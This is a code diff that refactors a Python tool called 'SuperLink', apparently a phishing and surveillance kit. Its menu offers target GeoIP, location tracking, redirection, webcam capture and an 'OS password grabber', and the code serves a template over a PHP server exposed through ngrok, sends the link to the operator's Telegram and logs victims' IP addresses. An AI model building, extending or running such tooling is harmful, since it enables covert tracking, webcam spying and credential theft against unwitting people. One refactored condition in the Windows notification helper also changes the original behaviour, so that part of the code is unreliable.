@@ -70,7 +70,7 @@ def check_py_version():
                 LR + "[!] This script requires at least python3.8 to work fine!")
             exit()
     else:
-        print(LR + "[!] This script only works for Python3 or later!")
+        print(f'{LR}[!] This script only works for Python3 or later!')
         exit()
 
 
@@ -83,14 +83,11 @@ def win10_notify(
     sys_info = uname()
     user_system = sys_info[0]
     system_release = sys_info[2]
-    if user_system != "Windows":
-        pass
-    else:
-        if system_release != "10":
-            pass
-        else:
-            notify = ToastNotifier()
-            notify.show_toast(title, msg, icon, duration, threaded)
+    if (
+        user_system != "Windows" or system_release == "10"
+    ) and user_system == "Windows":
+        notify = ToastNotifier()
+        notify.show_toast(title, msg, icon, duration, threaded)
 
 
 def superlink_art():
@@ -127,17 +124,13 @@ def banner():
 def list_files(dir_path: str = None):
     if dir_path is None:
         files = listdir(".")
-        num_files = 1
-        for file in files:
-            print(f" {num_files} --> " + file)
-            num_files += 1
+        for num_files, file in enumerate(files, start=1):
+            print(f" {num_files} --> {file}")
     else:
         files = listdir(dir_path)
         if len(files) != 0:
-            num_files = 1
-            for file in files:
-                print(f" {num_files} --> " + file)
-                num_files += 1
+            for num_files, file in enumerate(files, start=1):
+                print(f" {num_files} --> {file}")
         else:
             print(" [>] There is no file to show!")
 
@@ -153,10 +146,7 @@ def make_dirs():
 def current_working_dir():
     cwd = getcwd()
     user_system = uname()[0]
-    if user_system != "Windows":
-        cwd = cwd.split("/")[-1]
-    else:
-        cwd = cwd.split("\\")[-1]
+    cwd = cwd.split("/")[-1] if user_system != "Windows" else cwd.split("\\")[-1]
     if cwd == "/":
         cwd = ""
     return cwd
@@ -170,7 +160,6 @@ def press_enter():
 def get_link():
     username = uname()[1]
     cwd = current_working_dir()
-    proto_li = ["http://", "https://"]
     banner()
     sleep(0.1)
     print("\n" + LG + " [" + LR + "!" + LG + "]" + LW +
@@ -183,10 +172,10 @@ def get_link():
  └──╼/# """ + LW + "")
     if len(redirect_link) == 0:
         return None
-    else:
-        for p in proto_li:
-            redirect_link = redirect_link.replace(p, "")
-        return redirect_link
+    proto_li = ["http://", "https://"]
+    for p in proto_li:
+        redirect_link = redirect_link.replace(p, "")
+    return redirect_link
 
 
 def home_options():
@@ -198,28 +187,33 @@ def home_options():
     print("\n\n" + LG + " [" + LR + "01" + LG + "]" +
           LB + " Get target GeoIP and Sys info")
     sleep(0.1)
-    print(LG + " [" + LR + "02" + LG + "]" + LB +
-          " Get target location data (Lat, Long, Speed, ....)")
+    print(
+        (
+            f'{LG} [{LR}02{LG}]{LB}'
+            + " Get target location data (Lat, Long, Speed, ....)"
+        )
+    )
+
     sleep(0.1)
-    print(LG + " [" + LR + "03" + LG + "]" +
-          LB + " Redirect target to another URL")
+    print(((f'{LG} [{LR}03{LG}]' + LB) + " Redirect target to another URL"))
     sleep(0.1)
-    print(LG + " [" + LR + "04" + LG + "]" +
-          LB + " Webcam access & take a picture")
+    print(((f'{LG} [{LR}04{LG}]' + LB) + " Webcam access & take a picture"))
     sleep(0.1)
-    print(LG + " [" + LR + "05" + LG + "]" + LB +
-          " OS password grabber (only Win10)")
+    print((f'{LG} [{LR}05{LG}]{LB}' + " OS password grabber (only Win10)"))
     sleep(0.1)
-    print(LG + " [" + LR + "06" + LG + "]" +
-          LB + " Show all targets data files")
+    print(((f'{LG} [{LR}06{LG}]' + LB) + " Show all targets data files"))
     sleep(0.1)
-    print(LG + " [" + LR + "07" + LG + "]" + LB +
-          " Wipe out all previous targets data (IMG & TXT)")
+    print(
+        (
+            f'{LG} [{LR}07{LG}]{LB}'
+            + " Wipe out all previous targets data (IMG & TXT)"
+        )
+    )
+
     sleep(0.1)
-    print(LG + " [" + LR + "08" + LG + "]" +
-          LB + " Check for available updates!\n")
+    print(((f'{LG} [{LR}08{LG}]' + LB) + " Check for available updates!\n"))
     sleep(0.1)
-    print(LG + " [" + LR + "99" + LG + "]" + LY + " Quit :(\n")
+    print(f'{LG} [{LR}99{LG}]{LY}' + " Quit :(\n")
     sleep(0.1)
 
 
@@ -239,7 +233,7 @@ def start():
                             LC + "SuperLink" + LG + ")─[" + LC + f"~/{cwd}" + LG + "]" + """
  └──╼/$ """ + LW + ""))
             temps = loadTemplatePath()
-            if opt == "":
+            if not opt:
                 continue
             elif opt == "01":
                 EditIndexFile(temps.loadPath("1")).ChangeToGetDataFile()
@@ -269,14 +263,18 @@ def start():
             elif opt == "07":
                 banner()
                 print("\n")
-                t_print.out(LG + " [>] Deleting targets files... ")
+                t_print.out(f'{LG} [>] Deleting targets files... ')
                 sleep(3)
                 _del_.deleteAllFilesByType("txt", "./Target-Data")
                 _del_.deleteAllFilesByType("png", "./Target-Data")
                 _del_.deleteAllFilesByType("png", "./Webcam-Images")
-                t_print.out(LG + " [>] Targets files deleted successfully! ")
-                win10_notify("Files deleted!", "All of the targets files (TXT & IMG) have been successfully deleted!",
-                             icon=icons_path + "trash_empty.ico")
+                t_print.out(f'{LG} [>] Targets files deleted successfully! ')
+                win10_notify(
+                    "Files deleted!",
+                    "All of the targets files (TXT & IMG) have been successfully deleted!",
+                    icon=f'{icons_path}trash_empty.ico',
+                )
+
                 press_enter()
                 continue
             elif opt == "08":
@@ -305,20 +303,31 @@ def check_updates():
     try:
         banner()
         print("\n\n")
-        t_print.out(LG + " [>] Checking for new update...")
+        t_print.out(f'{LG} [>] Checking for new update...')
         if updater.new_update is False:
-            t_print.out(LG + " [>] Everything is up-to-date!")
+            t_print.out(f'{LG} [>] Everything is up-to-date!')
             win10_notify("Up-To-Date!", "Everything has been checked and there is not any new update!",
                          icon="./Modules/icons/green_check.ico")
         elif updater.new_update is None:
-            t_print.out(LY + " [!] Something went wrong!!!")
+            t_print.out(f'{LY} [!] Something went wrong!!!')
             win10_notify("Something went wrong!",
                          "Something unknown happened while checking for new update!\n"
                          "please check your network connection.",
                          icon="./Modules/icons/red_cross.ico")
         else:
-            t_print.out(LY + " [!] New update available! (" +
-                        LR + f"v{updater.new_update[0]}" + LY + f") #{updater.new_update[1]}")
+            t_print.out(
+                (
+                    (
+                        (
+                            (f'{LY} [!] New update available! (' + LR)
+                            + f"v{updater.new_update[0]}"
+                        )
+                        + LY
+                    )
+                    + f") #{updater.new_update[1]}"
+                )
+            )
+
             win10_notify("New update available!",
                          f"A new update released on github by the author\nnew version: {updater.new_update[0]}",
                          icon="./Modules/icons/exclamation_mark.ico")
@@ -326,14 +335,14 @@ def check_updates():
             select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
                                 LB + f" Do you want to download the new version ({updater.new_update[0]}) ? [y/n] " +
                                 LW + "").lower()
-            if select_down == "y" or select_down == "yes":
+            if select_down in ["y", "yes"]:
                 banner()
                 print("\n\n")
                 t_print.out(
                     LG + f" [>] Downloading new version ({updater.new_update[0]}) ...")
                 try:
                     up_downloader.download(f"../{up_file}")
-                    t_print.out(LG + f" [>] Downloaded successfully!")
+                    t_print.out(f"{LG} [>] Downloaded successfully!")
                     win10_notify("Update files downloaded!",
                                  "New update files successfully downloaded and gonna be extracted soon!",
                                  icon="./Modules/icons/download_folder.ico")
@@ -342,12 +351,18 @@ def check_updates():
                     sleep(2)
                     up_downloader.extract(
                         f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
-                    t_print.out(LG + f" [>] Update file successfully extracted in " +
-                                LW + f"[../{up_file}]".replace(".zip", ""))
+                    t_print.out(
+                        (
+                            LG
+                            + " [>] Update file successfully extracted in "
+                            + LW
+                        )
+                        + f"[../{up_file}]".replace(".zip", "")
+                    )
+
                     remove(f"../{up_file}")
                 except Exception as _:
-                    t_print.out(
-                        LR + f" [>] Something went wrong while updating!")
+                    t_print.out(f"{LR} [>] Something went wrong while updating!")
                 press_enter()
     except KeyboardInterrupt:
         exit()
@@ -385,54 +400,98 @@ class MainServer:
         banner()
         icons_path = "./Modules/icons/"
         print("\n\n")
-        self.t_print.out(LG + " [>] Processing...")
+        self.t_print.out(f'{LG} [>] Processing...')
         sleep(1)
         template_name = self.template_path.split("/")[2]
-        self.t_print.out(LG + " [>] Checking port & protocol...")
+        self.t_print.out(f'{LG} [>] Checking port & protocol...')
         sleep(1)
-        if self.proto is None:
-            proto = self.def_proto
-        else:
-            proto = self.proto
+        proto = self.def_proto if self.proto is None else self.proto
         try:
             self.t_print.out(
-                LG + " [>] Starting PHP server on port" + LW + f" ({self.def_port})")
+                f'{LG} [>] Starting PHP server on port{LW}' + f" ({self.def_port})"
+            )
+
             sleep(1)
             with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w", encoding="UTF-8") as php_log:
                 Popen(("php", "-S", f"localhost:{self.def_port}", "-t", self.template_path),
                       stderr=php_log, stdout=php_log)
-                self.t_print.out(LG + " [>] Generating the link...")
+                self.t_print.out(f'{LG} [>] Generating the link...')
                 conf.get_default().region = self.ngrok_region
                 conf.get_default().auth_token = self.ngrok_auth_token
                 link = ngrok.connect(self.def_port, proto).public_url
                 link = str(link).replace("http://", "https://")
                 local_mode = f"http://localhost:{self.def_port}"
-                self.t_print.out(LG + " [>] All done!")
-                win10_notify("Server started!", f"PHP & Ngrok server successfully started on port ({self.def_port})",
-                             icon=icons_path + "green_check.ico")
-                self.t_print.out(
-                    LG + " [>] Template Name : " + LW + template_name)
+                self.t_print.out(f'{LG} [>] All done!')
+                win10_notify(
+                    "Server started!",
+                    f"PHP & Ngrok server successfully started on port ({self.def_port})",
+                    icon=f'{icons_path}green_check.ico',
+                )
+
+                self.t_print.out(f'{LG} [>] Template Name : {LW}{template_name}')
                 sleep(0.4)
                 print("\n\n" + LG + " [>] Your Link : " + LW + link)
                 sleep(0.4)
                 print("\n" + LG + " [>] Localhost Mode : " +
                       LW + local_mode + "\n")
                 sleep(0.4)
-                self.t_print.out(
-                    LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
+                self.t_print.out(f'{LG} [>] Sending the link to your{LW} telegram{LG} ... ')
                 try:
                     self.tele_bot.sendMessage(
                         f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" +
                         f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                     self.t_print.out(
-                        LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
+                        f'{LG} [>] The link have been sent to your {LW}telegram{LG}'
+                        + " successfully!\n"
+                    )
+
                 except Exception as _:
-                    self.t_print.out(LR + " [>]" + LY + " Failed to send the link to your " +
-                                     LW + "telegram " + LY + "!")
+                    self.t_print.out(
+                        (
+                            (
+                                (
+                                    (
+                                        f'{LR} [>]{LY} Failed to send the link to your '
+                                        + LW
+                                    )
+                                    + "telegram "
+                                )
+                                + LY
+                            )
+                            + "!"
+                        )
+                    )
+
                     print("")
                 print(LR + "\n --------------------------------- \n")
-                print(LG + " [!] You can close the server by pressing" +
-                      LW + " [" + LR + "Ctrl+C" + LW + "]" + LG + " ... \n")
+                print(
+                    (
+                        (
+                            (
+                                (
+                                    (
+                                        (
+                                            (
+                                                (
+                                                    f'{LG} [!] You can close the server by pressing'
+                                                    + LW
+                                                )
+                                                + " ["
+                                            )
+                                            + LR
+                                        )
+                                        + "Ctrl+C"
+                                    )
+                                    + LW
+                                )
+                                + "]"
+                            )
+                            + LG
+                        )
+                        + " ... \n"
+                    )
+                )
+
                 self.get_user_data()
         except Exception as error:
             print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
@@ -461,13 +520,12 @@ class MainServer:
     @staticmethod
     def get_ip_addr():
         file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
-        if stat(file_path_ip).st_size != 0:
-            with open(file_path_ip, "r", encoding="UTF-8") as ip_file:
-                file_lines = ip_file.readlines()
-                target_ip = file_lines[-1]
-            return target_ip
-        else:
+        if stat(file_path_ip).st_size == 0:
             return None
+        with open(file_path_ip, "r", encoding="UTF-8") as ip_file:
+            file_lines = ip_file.readlines()
+            target_ip = file_lines[-1]
+        return target_ip
 
     def get_user_data(self):
         template_name = self.template_path.split("/")[2]
